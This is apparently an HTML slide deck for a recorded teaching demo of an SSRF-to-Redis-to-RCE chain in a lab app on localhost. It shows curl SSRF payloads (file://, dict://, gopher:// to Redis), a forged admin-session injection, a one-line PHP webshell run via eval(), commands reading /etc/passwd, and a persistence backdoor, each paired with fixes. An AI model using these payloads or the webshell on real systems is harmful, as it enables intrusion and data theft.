<?php
// presentation_slides_for_video.php - Optimized for screen recording
?>
<!DOCTYPE html>
<html>
<head>
    <title>SSRF → Redis → RCE: Complete Attack Chain Demonstration</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a1929;
            color: #fff;
            min-height: 100vh;
            overflow: hidden;
        }
        
        .slide {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            padding: 60px;
            display: none;
            background: linear-gradient(135deg, #0a1929 0%, #1a365d 100%);
        }
        
        .slide.active {
            display: block;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .slide-number {
            position: absolute;
            bottom: 20px;
            right: 30px;
            color: #4fd1c7;
            font-size: 1.2em;
            background: rgba(0,0,0,0.3);
            padding: 8px 16px;
            border-radius: 20px;
        }
        
        .title-slide h1 {
            font-size: 4em;
            color: #00d4ff;
            text-align: center;
            margin-top: 150px;
            text-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
        }
        
        .title-slide h2 {
            color: #4fd1c7;
            text-align: center;
            font-size: 2em;
            margin-top: 30px;
        }
        
        .author {
            position: absolute;
            bottom: 100px;
            left: 0;
            right: 0;
            text-align: center;
            color: #a0aec0;
            font-size: 1.5em;
        }
        
        .content-slide h1 {
            color: #00d4ff;
            font-size: 3em;
            margin-bottom: 40px;
            border-bottom: 3px solid #00d4ff;
            padding-bottom: 15px;
        }
        
        .two-column {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 50px;
            margin-top: 30px;
        }
        
        .code-block {
            background: #1a202c;
            border: 2px solid #00d4ff;
            border-radius: 10px;
            padding: 25px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 1.1em;
            overflow-x: auto;
        }
        
        .vulnerability-card {
            background: rgba(255, 107, 107, 0.1);
            border: 2px solid #ff6b6b;
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
        }
        
        .fix-card {
            background: rgba(72, 187, 120, 0.1);
            border: 2px solid #48bb78;
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
        }
        
        .demo-terminal {
            background: #000;
            color: #00ff9d;
            padding: 25px;
            border-radius: 10px;
            font-family: 'Consolas', monospace;
            font-size: 1.1em;
            margin: 20px 0;
        }
        
        .terminal-prompt { color: #00ff9d; }
        .terminal-command { color: #fff; }
        .terminal-output { color: #4fd1c7; }
        .terminal-comment { color: #718096; }
        
        .attack-chain {
            display: flex;
            justify-content: space-between;
            margin: 50px 0;
            position: relative;
        }
        
        .attack-chain:before {
            content: '';
            position: absolute;
            top: 50%;
            left: 5%;
            right: 5%;
            height: 4px;
            background: linear-gradient(90deg, #ff0080, #00d4ff, #00ff9d);
            z-index: 0;
        }
        
        .chain-step {
            background: #2d3748;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            width: 180px;
            position: relative;
            z-index: 1;
            border: 2px solid transparent;
        }
        
        .step-number {
            background: #ff0080;
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            font-weight: bold;
            font-size: 1.5em;
        }
        
        .impact-box {
            background: rgba(245, 101, 101, 0.1);
            border: 2px solid #f56565;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
        }
        
        .mitigation-box {
            background: rgba(72, 187, 120, 0.1);
            border: 2px solid #48bb78;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
        }
        
        .key-point {
            font-size: 1.3em;
            color: #4fd1c7;
            margin: 15px 0;
            padding-left: 20px;
            border-left: 4px solid #4fd1c7;
        }
        
        .highlight {
            color: #00ff9d;
            font-weight: bold;
        }
        
        .danger {
            color: #ff6b6b;
            font-weight: bold;
        }
        
        .success {
            color: #48bb78;
            font-weight: bold;
        }
    </style>
</head>
<body>

<!-- ============================ -->
<!-- SLIDE 1: TITLE SLIDE -->
<!-- ============================ -->
<div class="slide title-slide active" id="slide1">
    <h1>SSRF → Redis → RCE</h1>
    <h2>Complete Attack Chain Demonstration</h2>
    
    <div style="text-align: center; margin-top: 80px;">
        <div style="font-size: 5em; margin-bottom: 30px; color: #00d4ff;">
            🔥🔄💾⚡
        </div>
        <p style="font-size: 1.8em; color: #a0aec0;">
            From Server-Side Request Forgery to Remote Code Execution
        </p>
    </div>
    
    <div class="author">
        <p style="font-size: 1.5em;">Isan Jemal | Security Demonstration</p>
        <p style="color: #718096; margin-top: 10px;">Educational Purpose - Isolated Environment</p>
    </div>
    
    <div class="slide-number">1/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 2: APPLICATION OVERVIEW -->
<!-- ============================ -->
<div class="slide content-slide" id="slide2">
    <h1>Application Architecture</h1>
    
    <div class="two-column">
        <div>
            <h2 style="color: #4fd1c7;">🏗️ Technology Stack</h2>
            <div class="code-block">
Frontend:     HTML, CSS, JavaScript
Backend:      PHP 8.x
Session:      Redis (No Authentication)
Database:     SQLite
Server:       Apache/Nginx
            </div>
            
            <h2 style="color: #4fd1c7; margin-top: 30px;">🎯 Features</h2>
            <ul style="font-size: 1.3em; line-height: 1.8; margin-left: 20px;">
                <li>User Registration & Authentication</li>
                <li>Note Management System</li>
                <li>URL Import Functionality</li>
                <li>Admin Control Panel</li>
                <li>File Export Capability</li>
            </ul>
        </div>
        
        <div>
            <h2 style="color: #ff6b6b;">💀 Vulnerable Components</h2>
            
            <div class="vulnerability-card">
                <h3>1. import_note.php</h3>
                <p><span class="danger">SSRF Vulnerability</span><br>
                No URL validation, accepts dangerous protocols</p>
            </div>
            
            <div class="vulnerability-card">
                <h3>2. admin.php</h3>
                <p><span class="danger">Code Injection</span><br>
                Uses eval() on Redis content</p>
            </div>
            
            <div class="vulnerability-card">
                <h3>3. Redis Configuration</h3>
                <p><span class="danger">Missing Authentication</span><br>
                No password, accessible internally</p>
            </div>
            
            <div class="vulnerability-card">
                <h3>4. export.php</h3>
                <p><span class="danger">Arbitrary File Write</span><br>
                Writes Redis content to files</p>
            </div>
        </div>
    </div>
    
    <div class="slide-number">2/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 3: VULNERABILITY 1 - SSRF -->
<!-- ============================ -->
<div class="slide content-slide" id="slide3">
    <h1>Vulnerability 1: Server-Side Request Forgery</h1>
    
    <div class="two-column">
        <div>
            <h2 style="color: #ff6b6b;">💀 The Vulnerability</h2>
            
            <div class="code-block">
<span class="danger">// import_note.php - Lines 30-35</span>
$url = trim($_POST['url'] ?? '');

<span class="danger">// NO VALIDATION!</span>
$content = @file_get_contents($url, false, $ctx);

<span class="terminal-comment">// Accepts dangerous protocols:</span>
<span class="terminal-comment">// file:///etc/passwd</span>
<span class="danger">// dict://127.0.0.1:6379</span>
<span class="danger">// gopher://127.0.0.1:6379</span>
            </div>
            
            <div class="impact-box">
                <h3>🎯 Impact</h3>
                <ul>
                    <li>Access to internal services</li>
                    <li>Port scanning capabilities</li>
                    <li>Protocol injection attacks</li>
                    <li>Gateway to internal network</li>
                </ul>
            </div>
        </div>
        
        <div>
            <h2 style="color: #48bb78;">🛡️ The Fix</h2>
            
            <div class="code-block">
<span class="success">function validateUrl($url) {</span>
    $parsed = parse_url($url);
    $blocked = ['dict', 'gopher', 'file'];
    
    <span class="success">if (in_array($parsed['scheme'], $blocked)) {</span>
        <span class="success">return false;</span>
    }
    
    <span class="success">return filter_var($url, FILTER_VALIDATE_URL);</span>
<span class="success">}</span>

<span class="terminal-comment">// Usage:</span>
<span class="success">if (!validateUrl($url)) {</span>
    <span class="success">die("Invalid URL");</span>
<span class="success">}</span>
            </div>
            
            <div class="mitigation-box">
                <h3>📋 Best Practices</h3>
                <ul>
                    <li>Use allowlists, not blocklists</li>
                    <li>Validate URLs before fetching</li>
                    <li>Implement request timeouts</li>
                    <li>Use authentication for internal services</li>
                </ul>
            </div>
        </div>
    </div>
    
    <div class="slide-number">3/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 4: VULNERABILITY 2 - REDIS -->
<!-- ============================ -->
<div class="slide content-slide" id="slide4">
    <h1>Vulnerability 2: Redis Missing Authentication</h1>
    
    <div class="two-column">
        <div>
            <h2 style="color: #ff6b6b;">💀 The Vulnerability</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">redis-cli -h 127.0.0.1 ping</span>
<span class="terminal-output">PONG</span>
<br>
<span class="terminal-prompt">$ </span><span class="terminal-command">redis-cli -h 127.0.0.1 INFO</span>
<span class="terminal-output"># Server
redis_version:6.0.9
tcp_port:6379
...
# Security: NO PASSWORD SET</span>
            </div>
            
            <p style="margin-top: 20px; color: #ff6b6b; font-size: 1.2em;">
                <strong>Root Cause:</strong> Redis deployed with default settings
            </p>
            
            <div class="impact-box">
                <h3>🎯 Impact</h3>
                <ul>
                    <li>Full control of session store</li>
                    <li>Arbitrary data injection</li>
                    <li>Session hijacking</li>
                    <li>Privilege escalation vector</li>
                </ul>
            </div>
        </div>
        
        <div>
            <h2 style="color: #48bb78;">🛡️ The Fix</h2>
            
            <div class="code-block">
<span class="success"># redis.conf - Secure Configuration</span>
<span class="success">requirepass StrongPassword123!</span>
<span class="success">bind 127.0.0.1</span>
<span class="success">protected-mode yes</span>
<br>
<span class="success"># Rename dangerous commands</span>
<span class="success">rename-command FLUSHALL ""</span>
<span class="success">rename-command CONFIG ""</span>
<span class="success">rename-command EVAL ""</span>
            </div>
            
            <div class="mitigation-box">
                <h3>📋 Redis Security Checklist</h3>
                <ul>
                    <li>✅ Always set a strong password</li>
                    <li>✅ Bind to localhost only</li>
                    <li>✅ Rename dangerous commands</li>
                    <li>✅ Use network segmentation</li>
                    <li>✅ Enable protected mode</li>
                </ul>
            </div>
        </div>
    </div>
    
    <div class="slide-number">4/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 5: VULNERABILITY 3 - CODE INJECTION -->
<!-- ============================ -->
<div class="slide content-slide" id="slide5">
    <h1>Vulnerability 3: Code Injection in admin.php</h1>
    
    <div class="two-column">
        <div>
            <h2 style="color: #ff6b6b;">💀 The Vulnerability</h2>
            
            <div class="code-block">
<span class="danger">// admin.php - Critical vulnerable code</span>
$webshell_content = $redis->get("session_webshell_demo");

<span class="danger">if (isset($_GET['execute'])) {</span>
    <span class="danger">// ⚠️ DANGEROUS: Executes Redis content!</span>
    <span class="danger">eval('?>' . $webshell_content);</span>
<span class="danger">}</span>
            </div>
            
            <p style="margin-top: 20px; color: #ff6b6b; font-size: 1.2em;">
                <strong>Root Cause:</strong> eval() used on untrusted Redis data
            </p>
            
            <div class="demo-terminal" style="margin-top: 20px;">
<span class="terminal-prompt"># What gets executed:</span>
<span class="terminal-command">&lt;?php echo shell_exec($_GET['cmd'] ?? ''); ?&gt;</span>
<br>
<span class="terminal-prompt"># Trigger:</span>
<span class="terminal-command">/admin.php?execute=eval&cmd=whoami</span>
<br>
<span class="terminal-prompt"># Result:</span>
<span class="terminal-output">www-data</span>
            </div>
        </div>
        
        <div>
            <h2 style="color: #48bb78;">🛡️ The Fix</h2>
            
            <div class="code-block">
<span class="success">// NEVER DO THIS:</span>
<span class="danger">// eval($user_input);</span>
<br>
<span class="success">// INSTEAD DO THIS:</span>
<span class="success">echo htmlspecialchars($content);</span>
<br>
<span class="success">// Or better yet:</span>
<span class="success">$content = $redis->get($key);</span>
<span class="success">if ($content === false) {</span>
    <span class="success">// Handle missing key</span>
<span class="success">} else {</span>
    <span class="success">// SAFE output</span>
    <span class="success">echo htmlspecialchars($content, ENT_QUOTES, 'UTF-8');</span>
<span class="success">}</span>
            </div>
            
            <div class="mitigation-box">
                <h3>📋 PHP Security Hardening</h3>
                <div class="code-block" style="background: #1a202c; margin: 10px 0;">
<span class="success">; php.ini - Security Settings</span>
<span class="success">disable_functions = eval,exec,passthru,shell_exec,system</span>
<span class="success">open_basedir = /var/www/html</span>
<span class="success">allow_url_fopen = Off</span>
<span class="success">allow_url_include = Off</span>
                </div>
            </div>
        </div>
    </div>
    
    <div class="slide-number">5/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 6: COMPLETE ATTACK CHAIN -->
<!-- ============================ -->
<div class="slide content-slide" id="slide6">
    <h1>The Complete Attack Chain</h1>
    
    <div class="attack-chain">
        <div class="chain-step">
            <div class="step-number">1</div>
            <h3>Normal User</h3>
            <p>Limited access</p>
        </div>
        
        <div class="chain-step">
            <div class="step-number">2</div>
            <h3>Discover SSRF</h3>
            <p>Find import_note.php</p>
        </div>
        
        <div class="chain-step">
            <div class="step-number">3</div>
            <h3>Find Redis</h3>
            <p>Port 6379, no auth</p>
        </div>
        
        <div class="chain-step">
            <div class="step-number">4</div>
            <h3>Inject Admin</h3>
            <p>Session via SSRF</p>
        </div>
        
        <div class="chain-step">
            <div class="step-number">5</div>
            <h3>Inject Webshell</h3>
            <p>PHP code in Redis</p>
        </div>
        
        <div class="chain-step">
            <div class="step-number">6</div>
            <h3>Trigger eval()</h3>
            <p>Execute Redis content</p>
        </div>
        
        <div class="chain-step">
            <div class="step-number">7</div>
            <h3>Gain RCE</h3>
            <p>Arbitrary commands</p>
        </div>
        
        <div class="chain-step">
            <div class="step-number">8</div>
            <h3>Full Control</h3>
            <p>System compromise</p>
        </div>
    </div>
    
    <div style="text-align: center; margin-top: 50px;">
        <div style="font-size: 2em; color: #00ff9d;">
            SSRF → Redis Injection → Code Execution = Complete System Compromise
        </div>
    </div>
    
    <div class="key-point" style="margin-top: 40px;">
        <span class="danger">Key Insight:</span> Each vulnerability alone is dangerous, but chained together they enable complete system takeover.
    </div>
    
    <div class="slide-number">6/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 7: LIVE DEMO - PART 1 -->
<!-- ============================ -->
<div class="slide content-slide" id="slide7">
    <h1>Live Demonstration: Step 1-3</h1>
    
    <div class="two-column">
        <div>
            <h2 style="color: #4fd1c7;">🔍 Step 1: Discover SSRF</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">curl http://localhost:8080/notes.php | grep -i "import"</span>
<span class="terminal-output">&lt;input id="import_url" placeholder="https://example.com"&gt;</span>
<br>
<span class="terminal-prompt"># Found vulnerable endpoint:</span>
<span class="terminal-command">POST /import_note.php</span>
<span class="terminal-command">Parameter: url (unvalidated)</span>
            </div>
            
            <h2 style="color: #4fd1c7; margin-top: 30px;">🎯 Step 2: Test SSRF</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">curl -X POST -d "url=file:///etc/passwd" \</span>
<span class="terminal-prompt">     </span><span class="terminal-command">http://localhost:8080/import_note.php</span>
<span class="terminal-output">{"status":"ok","msg":"Imported successfully"}</span>
<br>
<span class="terminal-comment"># SSRF confirmed - can read local files</span>
            </div>
        </div>
        
        <div>
            <h2 style="color: #4fd1c7;">🔎 Step 3: Discover Redis</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">curl -X POST -d "url=dict://127.0.0.1:6379/INFO" \</span>
<span class="terminal-prompt">     </span><span class="terminal-command">http://localhost:8080/import_note.php</span>
<span class="terminal-output"># Server
redis_version:6.0.9
tcp_port:6379
...
# Clients
connected_clients:1</span>
<br>
<span class="terminal-comment"># Redis found! Port 6379, no authentication</span>
            </div>
            
            <h2 style="color: #4fd1c7; margin-top: 30px;">📊 Redis Protocol Injection</h2>
            
            <div class="code-block" style="font-size: 0.9em;">
<span class="terminal-comment"># Redis RESP Protocol:</span>
*3\r\n$3\r\nSET\r\n$19\r\nsession:admin\r\n$35\r\n{"user":"admin","role":"admin"}\r\n

<span class="terminal-comment"># URL encoded for SSRF:</span>
gopher://127.0.0.1:6379/_*3%0d%0a%243%0d%0aSET...
            </div>
        </div>
    </div>
    
    <div class="slide-number">7/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 8: LIVE DEMO - PART 2 -->
<!-- ============================ -->
<div class="slide content-slide" id="slide8">
    <h1>Live Demonstration: Step 4-6</h1>
    
    <div class="two-column">
        <div>
            <h2 style="color: #4fd1c7;">⚡ Step 4: Inject Admin Session</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">python3 ssrf_admin_takeover.py</span>
<span class="terminal-output">[*] SSRF → Redis Admin Takeover Exploit</span>
<span class="terminal-output">[+] Redis injection attempted</span>
<span class="terminal-output">[+] Set cookie: SID = admin_from_ssrf</span>
<br>
<span class="terminal-prompt">$ </span><span class="terminal-command">redis-cli GET session_admin_from_ssrf</span>
<span class="terminal-output">{"user":"admin","role":"admin"}</span>
            </div>
            
            <div style="margin-top: 20px; padding: 15px; background: rgba(0,212,255,0.1); border-radius: 10px;">
                <span class="success">✅ Privilege Escalation Achieved</span><br>
                Normal User → Admin Access
            </div>
        </div>
        
        <div>
            <h2 style="color: #4fd1c7;">💾 Step 5: Inject Webshell</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">python3 set_webshell_demo.py</span>
<span class="terminal-output">Stored value: &lt;?php echo shell_exec($_GET['cmd'] ?? ''); ?&gt;</span>
<br>
<span class="terminal-prompt">$ </span><span class="terminal-command">redis-cli GET session_webshell_demo</span>
<span class="terminal-output">&lt;?php echo shell_exec($_GET['cmd'] ?? ''); ?&gt;</span>
            </div>
            
            <h2 style="color: #4fd1c7; margin-top: 20px;">🔓 Step 6: Access Admin Panel</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">curl http://localhost:8080/admin.php</span>
<span class="terminal-output">session_webshell_demo => &lt;?php echo shell_exec($_GET['cmd'] ?? ''); ?&gt;</span>
<span class="terminal-comment"># PHP code stored but not executed yet</span>
            </div>
        </div>
    </div>
    
    <div class="key-point" style="margin-top: 30px;">
        <span class="danger">Critical:</span> The admin panel shows the PHP code but doesn't execute it. We need to find the eval() trigger.
    </div>
    
    <div class="slide-number">8/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 9: LIVE DEMO - PART 3 -->
<!-- ============================ -->
<div class="slide content-slide" id="slide9">
    <h1>Live Demonstration: Step 7 - Remote Code Execution</h1>
    
    <div style="text-align: center; margin-bottom: 30px;">
        <div style="font-size: 3em; color: #ff6b6b;">⚡ RCE ACHIEVED ⚡</div>
    </div>
    
    <div class="two-column">
        <div>
            <h2 style="color: #ff6b6b;">💥 Triggering eval()</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt"># Access with execute parameter:</span>
<span class="terminal-command">/admin.php?execute=eval&cmd=whoami</span>
<br>
<span class="terminal-prompt"># The eval() executes Redis content:</span>
<span class="terminal-output">www-data</span>
<br>
<span class="terminal-prompt"># Full system access:</span>
<span class="terminal-command">/admin.php?execute=eval&cmd=id</span>
<span class="terminal-output">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
            </div>
        </div>
        
        <div>
            <h2 style="color: #ff6b6b;">🎯 Demonstrating Impact</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">/admin.php?execute=eval&cmd=ls -la /</span>
<span class="terminal-output">total 84
drwxr-xr-x   1 root root 4096 Dec 20 12:34 .
drwxr-xr-x   1 root root 4096 Dec 20 12:34 ..
drwxr-xr-x   1 root root 4096 Dec 20 12:34 bin
drwxr-xr-x   2 root root 4096 Oct  3 15:19 boot
...</span>
<br>
<span class="terminal-prompt">$ </span><span class="terminal-command">/admin.php?execute=eval&cmd=cat /etc/passwd</span>
<span class="terminal-output">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/sh
...</span>
            </div>
        </div>
    </div>
    
    <div class="impact-box" style="margin-top: 30px;">
        <h3>🎯 Complete System Compromise Achieved</h3>
        <ul>
            <li>✅ Arbitrary command execution</li>
            <li>✅ File system access</li>
            <li>✅ User enumeration</li>
            <li>✅ Process listing</li>
            <li>✅ Database access</li>
            <li>✅ Network reconnaissance</li>
        </ul>
    </div>
    
    <div class="slide-number">9/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 10: ADVANCED EXPLOITATION -->
<!-- ============================ -->
<div class="slide content-slide" id="slide10">
    <h1>Advanced Exploitation & Persistence</h1>
    
    <div class="two-column">
        <div>
            <h2 style="color: #4fd1c7;">📁 Create Persistent Backdoor</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">/admin.php?execute=persist</span>
<span class="terminal-output">✅ Persistent backdoor created!
Access: /backdoor.php?cmd=whoami</span>
<br>
<span class="terminal-prompt">$ </span><span class="terminal-command">/backdoor.php?cmd=whoami</span>
<span class="terminal-output">www-data</span>
            </div>
            
            <div style="margin-top: 20px; padding: 15px; background: rgba(255,107,107,0.1); border-radius: 10px;">
                <span class="danger">⚠️ Real Attackers Would:</span>
                <ul style="margin-top: 10px;">
                    <li>Add cron jobs for persistence</li>
                    <li>Install reverse shells</li>
                    <li>Steal credentials</li>
                    <li>Cover tracks (delete logs)</li>
                </ul>
            </div>
        </div>
        
        <div>
            <h2 style="color: #4fd1c7;">🔄 Lateral Movement</h2>
            
            <div class="demo-terminal">
<span class="terminal-prompt">$ </span><span class="terminal-command">/advanced_attacks.php?attack=recon</span>
<span class="terminal-output">=== System Info ===
Linux server 5.10.0
=== Current User ===
www-data
=== Network ===
Active Internet connections
...</span>
<br>
<span class="terminal-prompt">$ </span><span class="terminal-command">/advanced_attacks.php?attack=exfil</span>
<span class="terminal-output">=== Database Files ===
/var/www/html/data/app.db
=== Config Files ===
/var/www/html/src/bootstrap.php
...</span>
            </div>
        </div>
    </div>
    
    <div class="key-point" style="margin-top: 30px;">
        <span class="danger">Business Impact:</span> Data breach, service disruption, reputation damage, regulatory fines (GDPR), legal liability.
    </div>
    
    <div class="slide-number">10/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 11: DEFENSE STRATEGIES -->
<!-- ============================ -->
<div class="slide content-slide" id="slide11">
    <h1>Defense-in-Depth Strategies</h1>
    
    <div class="two-column">
        <div>
            <h2 style="color: #48bb78;">🔐 Prevention Measures</h2>
            
            <div class="fix-card">
                <h3>For SSRF:</h3>
                <ul>
                    <li>✅ Validate all URLs before fetching</li>
                    <li>✅ Use allowlists for schemes</li>
                    <li>✅ Implement request timeouts</li>
                    <li>✅ Network segmentation</li>
                </ul>
            </div>
            
            <div class="fix-card">
                <h3>For Redis:</h3>
                <ul>
                    <li>✅ Enable authentication</li>
                    <li>✅ Bind to localhost only</li>
                    <li>✅ Rename dangerous commands</li>
                    <li>✅ Use firewall rules</li>
                </ul>
            </div>
            
            <div class="fix-card">
                <h3>For Code Injection:</h3>
                <ul>
                    <li>✅ Never use eval() on user input</li>
                    <li>✅ Use htmlspecialchars() for output</li>
                    <li>✅ Implement CSP headers</li>
                    <li>✅ Regular code reviews</li>
                </ul>
            </div>
        </div>
        
        <div>
            <h2 style="color: #48bb78;">🛡️ Security Architecture</h2>
            
            <div style="background: rgba(72,187,120,0.1); padding: 25px; border-radius: 15px; height: 100%;">
                <h3>Defense-in-Depth Layers:</h3>
                
                <div style="margin: 20px 0;">
                    <div style="background: #2d3748; padding: 15px; margin: 10px 0; border-radius: 8px;">
                        <span class="success">1. Network Layer:</span> Firewalls, VLAN segmentation
                    </div>
                    
                    <div style="background: #2d3748; padding: 15px; margin: 10px 0; border-radius: 8px;">
                        <span class="success">2. Application Layer:</span> WAF, input validation
                    </div>
                    
                    <div style="background: #2d3748; padding: 15px; margin: 10px 0; border-radius: 8px;">
                        <span class="success">3. Service Layer:</span> Authentication, least privilege
                    </div>
                    
                    <div style="background: #2d3748; padding: 15px; margin: 10px 0; border-radius: 8px;">
                        <span class="success">4. Data Layer:</span> Encryption, access controls
                    </div>
                    
                    <div style="background: #2d3748; padding: 15px; margin: 10px 0; border-radius: 8px;">
                        <span class="success">5. Monitoring Layer:</span> SIEM, logging, alerting
                    </div>
                </div>
                
                <div class="key-point">
                    <span class="success">Security Principle:</span> Assume breach - focus on detection and response.
                </div>
            </div>
        </div>
    </div>
    
    <div class="slide-number">11/12</div>
</div>

<!-- ============================ -->
<!-- SLIDE 12: CONCLUSION -->
<!-- ============================ -->
<div class="slide content-slide" id="slide12">
    <h1>Key Takeaways & Lessons Learned</h1>
    
    <div style="text-align: center; margin: 40px 0;">
        <div style="font-size: 4em; color: #00d4ff; margin-bottom: 30px;">
            🎓🔥🛡️
        </div>
        <div style="font-size: 2em; color: #00ff9d;">
            Understand Attacks → Build Better Defenses
        </div>
    </div>
    
    <div class="two-column">
        <div>
            <h2 style="color: #4fd1c7;">📚 Technical Insights</h2>
            
            <div class="key-point">SSRF is a gateway to internal services</div>
            <div class="key-point">Redis without auth is an open door</div>
            <div class="key-point">eval() should never touch user data</div>
            <div class="key-point">Chained vulnerabilities multiply impact</div>
            <div class="key-point">Defense requires multiple layers</div>
        </div>
        
        <div>
            <h2 style="color: #4fd1c7;">🚀 Strategic Insights</h2>
            
            <div class="key-point">Security is everyone's responsibility</div>
            <div class="key-point">Assume breach - focus on detection</div>
            <div class="key-point">Regular testing finds issues early</div>
            <div class="key-point">Education prevents many attacks</div>
            <div class="key-point">Continuous improvement is key</div>
        </div>
    </div>
    
    <div style="text-align: center; margin-top: 60px;">
        <div style="font-size: 1.8em; color: #00d4ff;">
            🔥 RCE Achieved | 🛡️ Lessons Learned | 🚀 Better Security
        </div>
        
        <div style="margin-top: 40px; color: #a0aec0;">
            <p>Isan Jemal | Security Demonstration</p>
            <p style="font-size: 0.9em; margin-top: 10px;">Educational Purpose - Isolated Environment</p>
        </div>
    </div>
    
    <div class="slide-number">12/12</div>
</div>

<script>
    let currentSlide = 1;
    const totalSlides = 12;
    
    function showSlide(n) {
        // Hide all slides
        document.querySelectorAll('.slide').forEach(slide => {
            slide.classList.remove('active');
        });
        
        // Show selected slide
        document.getElementById(`slide${n}`).classList.add('active');
        currentSlide = n;
    }
    
    function nextSlide() {
        if (currentSlide < totalSlides) {
            showSlide(currentSlide + 1);
        }
    }
    
    function prevSlide() {
        if (currentSlide > 1) {
            showSlide(currentSlide - 1);
        }
    }
    
    // Keyboard navigation
    document.addEventListener('keydown', (e) => {
        if (e.key === 'ArrowRight' || e.key === ' ') nextSlide();
        if (e.key === 'ArrowLeft') prevSlide();
        if (e.key >= 1 && e.key <= 9) showSlide(parseInt(e.key));
    });
    
    // Initialize
    showSlide(1);
</script>

</body>
</html>